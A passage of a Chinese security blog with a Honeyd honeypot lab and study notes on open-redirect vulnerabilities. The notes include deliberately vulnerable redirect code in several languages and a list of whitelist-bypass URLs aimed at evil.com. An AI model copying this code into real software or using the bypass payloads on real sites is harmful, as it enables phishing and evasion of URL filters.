<h4 id="安装Honeyd"><a href="#安装Honeyd" class="headerlink" title="安装Honeyd"></a>安装Honeyd</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tar -zxvf honeyd-1.5c.tar.gz</span><br><span class="line">sudo ./configure</span><br><span class="line">#报错：configure: error: Couldn&apos;t figure out how to access libc</span><br><span class="line">#解决：sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717614.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717760.42.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717808.49.png" alt></p>
<h4 id="检测arpd和honeyd是否可以运行"><a href="#检测arpd和honeyd是否可以运行" class="headerlink" title="检测arpd和honeyd是否可以运行"></a>检测arpd和honeyd是否可以运行</h4><h5 id="arpd"><a href="#arpd" class="headerlink" title="arpd"></a>arpd</h5><h5 id><a href="#" class="headerlink" title></a><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542717918.17.png" alt></h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#运行后显示链接不存在</span><br><span class="line">#解决：</span><br><span class="line">whereis  libevent-1.4.so.2</span><br><span class="line">#将libevent-1.4.so.2位置添加到/etc/ld.so.conf</span><br><span class="line">sudo vim /etc/ld.so.conf</span><br><span class="line">#重新加载链接</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718321.01.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718381.8.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718352.41.png" alt></p>
<h5 id="honeyd"><a href="#honeyd" class="headerlink" title="honeyd"></a>honeyd</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">honeyd</span><br><span class="line">#报错：无法加载libdnet</span><br><span class="line">#解决：也是无法链接，但是这个缺少链接文件：</span><br><span class="line">whereis libdnet</span><br><span class="line">#生成链接</span><br><span class="line">sudo cp /usr/local/lib/libdnet.1.0.1 /usr/local/lib/libdnet.so.1.0.1</span><br><span class="line">#重新加载</span><br><span class="line">sudo /sbin/ldconfig</span><br><span class="line">sudo updatedb</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718573.78.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542718977.76.png" alt></p>
<h3 id="简单的调试与测试"><a href="#简单的调试与测试" class="headerlink" title="简单的调试与测试"></a>简单的调试与测试</h3><ul>
<li><p>arpd侦听ens33网卡上的一个空闲的ip:192.168.1.71  </p>
<p><code>sudo arpd -i ens33 192.168.1.71</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719524.81.png" alt></p>
</li>
<li><p>将honeyd下的config.sample改名并配置蜜罐启动的系统及其配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mv config.sample ./honeyd.conf</span><br><span class="line">sudo vim honeyd.conf</span><br><span class="line"># Example of a simple host template and its binding</span><br><span class="line">create windows</span><br><span class="line">#创建一个windows xp系统的蜜罐</span><br><span class="line">set windows personality &quot;Microsoft Windows XP Professional SP1&quot;</span><br><span class="line">#设置系统重启时间</span><br><span class="line">set windows uptime 1728650</span><br><span class="line">#设置最大文件描述符</span><br><span class="line">set windows maxfds 35</span><br><span class="line">#开启80端口web服务且侦听脚本为honeyd-1.5c/scripts/web.sh</span><br><span class="line">add windows tcp port 80 &quot;sh sh //home/toml/Desktop/honeyd/honeyd-1.5c/scripts/web.sh&quot;</span><br><span class="line">#开启22，23端口</span><br><span class="line">add windows tcp port 22 &quot;sh scripts/test.sh $ipsrc $dport&quot;</span><br><span class="line">add windows tcp port 23 proxy $ipsrc:23</span><br><span class="line">#add template udp port 53 proxy 141.211.92.141:53</span><br><span class="line">#关闭默认的tcp,udp连接</span><br><span class="line">set windows default tcp action reset</span><br><span class="line">set windows default udp action reset</span><br><span class="line">#开启135，139端口</span><br><span class="line">add windows tcp port 135 open</span><br><span class="line">add windows tcp port 139 open</span><br><span class="line"></span><br><span class="line">bind 192.168.1.71 windows</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542719973.36.png" alt></p>
</li>
<li><p>启动honeyd </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo honeyd -d -f honeyd.conf  -p nmap.prints -x xprobe2.conf -a nmap.assoc -i ens33 192.168.1.71</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720601.46.png" alt></p>
</li>
<li><p>在同网段下ping，访问web服务</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720665.52.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720690.71.png" alt></p>
</li>
<li><p>蜜罐的监听显示如下（分别是本机ping蜜罐机192.168.1.71的ping包和本机访问蜜罐主机的80端口建立连接的过程）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542720889.75.png" alt></p>
</li>
<li><p>蜜罐主机应用的web服务显示的脚本内容</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542721041.24.png" alt></p>
</li>
</ul>
<h3 id="实验思考题"><a href="#实验思考题" class="headerlink" title="实验思考题"></a>实验思考题</h3><p>如何利用Honeyd实现跨网段的模拟。</p>
<p>回答：</p>
<ol>
<li>可以利用wmware自带的NAT模式实现路由转发的功能，达到跨网段访问的目的。</li>
<li>可以通过自己手动配置路由表，添加路由规则实现跨网段访问的目的。</li>
</ol>
<h3 id="实验中的问题"><a href="#实验中的问题" class="headerlink" title="实验中的问题"></a>实验中的问题</h3><ol>
<li>对于Libpcap的安装：在Debian下1.7.3版本太高，会出现头文件的报错，使用1.5.3版本，Ubuntu系统无影响；在Ubuntu下缺少 flex  bison ，需要手动安装。</li>
<li>安装完所有的依赖及honeyd后需要配置arpd和honeyd链接的问题，不然无法运行。</li>
</ol>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）" target="_blank" rel="noopener">https://blog.csdn.net/key_1997/article/details/81322352（Ubuntu系统）</a></p>
<p><a href="https://blog.csdn.net/accepthjp/article/details/46399715" target="_blank" rel="noopener">https://blog.csdn.net/accepthjp/article/details/46399715</a></p>
<p><a href="https://blog.csdn.net/LFGxiaogang/article/details/73287152" target="_blank" rel="noopener">https://blog.csdn.net/LFGxiaogang/article/details/73287152</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>蜜罐</tag>
      </tags>
  </entry>
  <entry>
    <title>URL跳转学习总结</title>
    <url>/2018/11/12/URL%E8%B7%B3%E8%BD%AC%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="URL跳转漏洞学习总结"><a href="#URL跳转漏洞学习总结" class="headerlink" title="URL跳转漏洞学习总结"></a>URL跳转漏洞学习总结</h2><h3 id="相关背景"><a href="#相关背景" class="headerlink" title="相关背景"></a>相关背景</h3><p>现在web应用越来越多的需要和其他第三方应用交互，以及在自身应用内部根据不同的逻辑引向不同的页面。例如一个典型的场景就是：web站点可以使用第三方账号（如qq,微博等）进行登录，在登录时就会发生跳转，如果在这个过程中没有做好安全策略就会产生安全漏洞。例如可以利用恶意的URL跳转进行钓鱼等。</p>
<h3 id="URL重定向（301-302）"><a href="#URL重定向（301-302）" class="headerlink" title="URL重定向（301/302）"></a>URL重定向（301/302）</h3><ol>
<li>301重定向：当域名或者网址永久弃用后，为了方便可以将此域名或网址重定向到新的域名或URL</li>
<li>302重定向：当域名或网址临时弃用时，为了方便可以将此域名或网址重定向到新的域名或URL</li>
<li>302URL劫持与302任意URL跳转的不同点<ul>
<li>302——URL劫持是由于搜素引擎的算法导致的问题。例如A网站暂时弃用，要302重定向到B网站，但是由于B网站URL太过复杂，而搜索引擎的算法判定A网址更加适合，所以爬取的还是A网址，这个时候访问网站是显示的URL是A网站的，而显示的内容是B网站的，造成了302重定向——URL劫持。</li>
<li>302——任意URL跳转是用户可以直接控制URL跳转的参数或者通过一些绕过方式控制URL跳转的位置造成的问题。</li>
</ul>
</li>
</ol>
<h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>web站点或者第三方的服务端没有对用户输入的参数进行合法性校验，或者校验不严格，在URL跳转时用户可控，导致恶意参数的传入以及执行，将应用程序引导到恶意的第三方区域产生的安全问题（短链接更加难以防范）。</p>
<h4 id="漏洞出现的详细原因"><a href="#漏洞出现的详细原因" class="headerlink" title="漏洞出现的详细原因"></a>漏洞出现的详细原因</h4><ul>
<li>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道/不认为这是个漏洞</li>
<li>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过</li>
<li>对传入参数做一些奇葩的操作(域名剪切/拼接/重组)和判断，适得其反，反被绕过</li>
<li>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过</li>
<li>原始语言、服务器/容器特性、浏览器等对标准URL协议解析处理等差异性导致被绕过</li>
</ul>
<h3 id="WEB站点中URL跳转漏洞的发生点"><a href="#WEB站点中URL跳转漏洞的发生点" class="headerlink" title="WEB站点中URL跳转漏洞的发生点"></a>WEB站点中URL跳转漏洞的发生点</h3><ul>
<li>用户登录、统一身份认证处、认证以后发生跳转</li>
<li>用户分享、收藏内容后会发生跳转</li>
<li>跨站点认证、在授权后会认证</li>
<li>站内对其他网站的链接，点击后会跳转</li>
</ul>
<h3 id="URL跳转的实现方式"><a href="#URL跳转的实现方式" class="headerlink" title="URL跳转的实现方式"></a>URL跳转的实现方式</h3><ul>
<li><p>通过META标签内跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">"url"</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $url = $_REQUEST[<span class="string">"url"</span>];</span></span><br><span class="line"><span class="php">&#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    $url = <span class="string">"url_meta.php"</span>;</span></span><br><span class="line"><span class="php">&#125; </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Refresh"</span> <span class="attr">content</span>=<span class="string">"5; url=&lt;?php echo $url?&gt;"</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529489.94.png" alt></p>
</li>
</ul>
</li>
<li><p>通过JavaScript跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span> (isset($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	echo <span class="string">"&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;"</span>;</span><br><span class="line">	exit;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	echo <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529568.87.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542529591.92.png" alt></p>
</li>
</ul>
</li>
<li><p>通过header头跳转</p>
<ul>
<li><p>实例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	header(<span class="string">"Location: $target"</span>);</span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>如果jump参数没有任何限制，用户就可以构造恶意链接进行提交造成恶意URL跳转 <code>http://www.lsowl.xyz/aaa.php?url=http://www.eval.com</code> ，通过恶意链接造成不可信的第三方跳转可以进一步钓鱼等(直接跳转)。</p>
</li>
<li><p>同时由于一些网站的安全策略，白名单中有 <code>http://www.lsowl.xyz/aaa.php</code> 而导致一些安全策略被绕过，导致用户最终访问的时恶意链接。（过滤不严格的白名单）</p>
</li>
</ul>
</li>
</ul>
<p>通过GET或POST的方式接收将要跳转的URL，然后通过上面的几种方式中的一种来跳转到目标URL。由于用户的输入会进入META，JavaScript，http头，所以都可能发生相应的上下文漏洞，如XSS等，同时URL跳转功能的特点，会在浏览器将用户从可信的站点跳转到不可信的站点，如果用户的输入带有敏感信息会泄露给不可信的第三方。</p>
<h3 id="常见的发生URL跳转的参数名"><a href="#常见的发生URL跳转的参数名" class="headerlink" title="常见的发生URL跳转的参数名"></a>常见的发生URL跳转的参数名</h3><ul>
<li>redirect</li>
<li>redirect_to</li>
<li>redirect_url</li>
<li>url</li>
<li>jump</li>
<li>jump_to</li>
<li>target</li>
<li>to</li>
<li>link</li>
<li>linkto</li>
<li>domain</li>
</ul>
<h3 id="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"><a href="#几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）" class="headerlink" title="几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）"></a>几种语句和框架版本常见的URL跳转代码（可以作为白盒测试的参考）</h3><ul>
<li><p>Java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(request.getParameter(<span class="string">"url"</span>));</span><br></pre></td></tr></table></figure>
</li>
<li><p>PHP</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$redirect_url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">header(<span class="string">"Location: "</span> . $redirect_url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>.NET</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">string redirect_url = request.QueryString[&quot;url&quot;];</span><br><span class="line">Response.Redirect(redirect_url);</span><br></pre></td></tr></table></figure>
</li>
<li><p>Django</p>
<figure class="highlight django"><table><tr><td class="code"><pre><span class="line"><span class="xml">redirect_url = request.GET.get("url")</span></span><br><span class="line"><span class="xml">HttpResponseRedirect(redirect_url)</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>Flask</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_url = request.form[&apos;url&apos;]</span><br><span class="line">redirect(redirect_url)</span><br></pre></td></tr></table></figure>
</li>
<li><p>Rails</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redirect_to params[:url]</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="网站后端对白名单限制（以PHP为例）"><a href="#网站后端对白名单限制（以PHP为例）" class="headerlink" title="网站后端对白名单限制（以PHP为例）"></a>网站后端对白名单限制（以PHP为例）</h3><ul>
<li><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// $allowedDomains 表示允许跳转的url白名单</span></span><br><span class="line">$allowedDomains = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">"aaaa.com"</span></span><br><span class="line">        <span class="string">"bbbb.com"</span></span><br><span class="line">        .......</span><br><span class="line">    );</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encodeUrl</span><span class="params">($urlInfo)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $path = <span class="keyword">isset</span>($urlInfo[<span class="string">'path'</span>]) ? $urlInfo[<span class="string">'path'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($path))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"/"</span>, $path);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $t[$i] = rawurlencode($t[$i]);             </span><br><span class="line">            &#125;</span><br><span class="line">            $path = implode(<span class="string">"/"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        $query = <span class="keyword">isset</span>($urlInfo[<span class="string">'query'</span>]) ? $urlInfo[<span class="string">'query'</span>] : <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($query))</span><br><span class="line">        &#123;</span><br><span class="line">            $t = explode(<span class="string">"&amp;"</span>, $query);</span><br><span class="line">             </span><br><span class="line">            <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; count($t); $i++)</span><br><span class="line">            &#123;</span><br><span class="line">                $tt = explode(<span class="string">"="</span>, $t[$i]);</span><br><span class="line">                $tt[<span class="number">1</span>] = rawurlencode($tt[<span class="number">1</span>]);</span><br><span class="line">                $t[$i] = implode(<span class="string">"="</span>, $tt);            </span><br><span class="line">            &#125;</span><br><span class="line">            $query = implode(<span class="string">"&amp;"</span>, $t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($urlInfo[<span class="string">'host'</span>]) || <span class="keyword">empty</span>($urlInfo[<span class="string">'host'</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> $path. <span class="string">"?"</span>. $query;</span><br><span class="line">        &#125;</span><br><span class="line">        $scheme = <span class="keyword">isset</span>($urlInfo[<span class="string">'scheme'</span>]) ? $urlInfo[<span class="string">'scheme'</span>] : <span class="string">'http'</span>;</span><br><span class="line">        $port = <span class="keyword">isset</span>($urlInfo[<span class="string">'port'</span>]) ? $urlInfo[<span class="string">'port'</span>] : <span class="number">80</span>;</span><br><span class="line"> </span><br><span class="line">         </span><br><span class="line">        $request = $scheme . <span class="string">'://'</span>. $urlInfo[<span class="string">'host'</span>];</span><br><span class="line">        $request .= ($port == <span class="number">80</span>) ? <span class="string">''</span> : <span class="string">':'</span>.$port;</span><br><span class="line">        $request .= $path;</span><br><span class="line">        $request .= (<span class="keyword">empty</span>($query)) ? <span class="string">''</span> : <span class="string">'?'</span>.$query;</span><br><span class="line">        <span class="keyword">return</span> $request;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUrl</span><span class="params">($url,$domainArr=array<span class="params">()</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $res = <span class="keyword">array</span>(<span class="string">'isTrustedDomain'</span> =&gt; <span class="keyword">false</span>,<span class="string">'url'</span> =&gt; <span class="string">''</span>,<span class="string">'domain'</span> =&gt; <span class="string">''</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url))     <span class="keyword">return</span> $res;</span><br><span class="line">        $domainArr = <span class="keyword">empty</span>($domainArr) || !is_array($domainArr) ? $allowedDomains : $domainArr;</span><br><span class="line">        $url      = filterUrl($url);<span class="comment">//先过滤特殊字符</span></span><br><span class="line">        $p      = parse_url($url);</span><br><span class="line">        $scheme = $p[<span class="string">'scheme'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!in_array(strtolower($scheme),<span class="keyword">array</span>(<span class="string">'http'</span>,<span class="string">'https'</span>)))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        $host   = $p[<span class="string">'host'</span>];</span><br><span class="line">        <span class="keyword">if</span>(!isValidHost($host))&#123;</span><br><span class="line">            <span class="keyword">return</span> $res;</span><br><span class="line">        &#125;</span><br><span class="line">        $hostLen = strlen($host);</span><br><span class="line">        <span class="keyword">foreach</span>($domainArr <span class="keyword">as</span> $domain)&#123;</span><br><span class="line">            $firstPos = strpos($host, $domain);</span><br><span class="line">            <span class="keyword">if</span>($firstPos !== <span class="keyword">false</span> &amp;&amp; ($firstPos + strlen($domain)) == $hostLen)&#123;</span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">if</span>($firstPos == <span class="number">0</span> || $domain[<span class="number">0</span>] == <span class="string">'.'</span> || $host[$firstPos<span class="number">-1</span>] == <span class="string">'.'</span>)&#123;</span><br><span class="line">                    $res[<span class="string">'isTrustedDomain'</span>] = <span class="keyword">true</span>;</span><br><span class="line">                    $res[<span class="string">'url'</span>]                         = $url;</span><br><span class="line">                    $res[<span class="string">'domain'</span>]              = $domain;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterUrl</span><span class="params">( $url )</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($url)) <span class="keyword">return</span> $url;</span><br><span class="line">        <span class="comment">// Strip all of the Javascript in script tags out...</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/&lt;SCRIPT.*?&lt;\/SCRIPT&gt;/ims'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">// Strip all blank character</span></span><br><span class="line">        $url = preg_replace(<span class="string">'/[\s\v\0]+/'</span>,<span class="string">""</span>,$url);</span><br><span class="line">        <span class="comment">//Strip special characters(',",&lt;,&gt;,\)</span></span><br><span class="line">        $url = str_replace(<span class="keyword">array</span>(<span class="string">"'"</span>,<span class="string">"\""</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"\\"</span>),<span class="string">''</span>,$url);</span><br><span class="line">        <span class="keyword">return</span> $url;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidHost</span><span class="params">($host)</span></span></span><br><span class="line"><span class="function">    </span>&#123;<span class="comment">/*&#123;&#123;&#123;*/</span></span><br><span class="line">        $p = <span class="string">"/^[0-9a-zA-Z\-\.]+$/"</span>;</span><br><span class="line">        <span class="keyword">return</span> preg_match($p,$host) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    &#125;<span class="comment">/*&#125;&#125;&#125;*/</span></span><br><span class="line">     </span><br><span class="line">$url = <span class="string">"https://www.baidu.com"</span>;</span><br><span class="line">$call_back_url = trim($url);</span><br><span class="line">$call_back_url = encodeUrl(parse_url(urldecode($call_back_url)));</span><br><span class="line">$res = checkUrl($call_back_url, $domainArr);</span><br><span class="line"> </span><br><span class="line">var_dump($res);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="攻击方式及危害性"><a href="#攻击方式及危害性" class="headerlink" title="攻击方式及危害性"></a>攻击方式及危害性</h3><ul>
<li>恶意用户借助URL跳转构造钓鱼页面欺骗其他用户，以及获取敏感信息等，在有在线业务的站点危害较大。</li>
<li>借助URL跳转突破一些基于白名单的安全机制。如：传统的IM对URL的传播进行安全校验，但对于大站点的域名及URL直接允许通过并显示可信的URL，如果该URL中包含恶意跳转可能会导致安全限制被绕过。</li>
<li>基于白名单引用的资源，这种方式与上面的类似。比如：引入youku.com的视频，白名单中检测的时youku.com,如果包含恶意链接还是可能突破限制。</li>
<li>在带referer传输的站点中，就不只会产生任意URL跳转这个问题，同时可能会造成所有基于referer的安全策略失效（比较少见）</li>
</ul>
<h3 id="模拟跨域请求"><a href="#模拟跨域请求" class="headerlink" title="模拟跨域请求"></a>模拟跨域请求</h3><ul>
<li><p>在header头中跳转：（并没有带referer请求，所以这里只会产生任意URL及钓鱼诈骗等）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">url.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>])) &#123;</span><br><span class="line">	$target = $_GET[<span class="string">'url'</span>];</span><br><span class="line">	<span class="comment">// 使服务端进行302跳转</span></span><br><span class="line">	header(<span class="string">"Location: $target"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//在JavaScript中跳转</span></span><br><span class="line">	<span class="comment">// echo "&lt;script&gt;window.location.href=\"$target\"&lt;/script&gt;";</span></span><br><span class="line">	<span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Please input the URL"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">referer.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_REFERER'</span>])) &#123;</span><br><span class="line">	$referer = $_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">	<span class="keyword">if</span> (strpos($referer, <span class="string">"127.0.0.1:81"</span>)) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"referer is true"</span>;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"Wrong referer"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"referer is null"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>访问：<code>http://127.0.0.1:81/url.php?url=http://127.0.0.1:82/referer.php</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530507.75.png" alt></p>
</li>
<li><p>在js中跳转（带referer传输，除了任意URL跳转漏洞之外还会绕过基于referer的所有安全策略）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1542530750.79.png" alt></p>
</li>
</ul>
<h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><ul>
<li>抓取数据包中状态码为302的URL</li>
<li>修改目标地址</li>
<li>查看是否正常跳转（如果不存在直接返回到它自己的域名，如果存在则跳转）</li>
<li>尝试绕过</li>
<li>注意点：协议一致性问题。有些网站校验跳转后的协议必须为HTTPS，有时候无法跳转并不会提示。</li>
</ul>
<h3 id="常见的绕过方式（利用浏览器对URL特性的支持）"><a href="#常见的绕过方式（利用浏览器对URL特性的支持）" class="headerlink" title="常见的绕过方式（利用浏览器对URL特性的支持）"></a>常见的绕过方式（利用浏览器对URL特性的支持）</h3><ol>
<li><p>“@”  （在Firefox中使用会有弹窗提示，其他浏览器没有）</p>
<p><code>http://www.target.com/redirecturl=http://whitelist.com@evil.com</code></p>
</li>
<li><p>“.”</p>
<p><code>http://www.target.com/redirecturl=.eval.com</code></p>
</li>
<li><p>“/”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com/whitelist.com</code></p>
<p><code>http://www.target.com/redirecturl=/http://evil.com</code></p>
</li>
<li><p>“\”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\a.whitelist.com</code></p>
</li>
<li><p>“\\”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\\a.whitelist.com</code></p>
</li>
<li><p>“\.”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com\.a.whitelist.com</code></p>
</li>
<li><p>“?”</p>
<p><code>http://www.target.com/redirecturl=http://evil.com?a.whitelist.com</code></p>
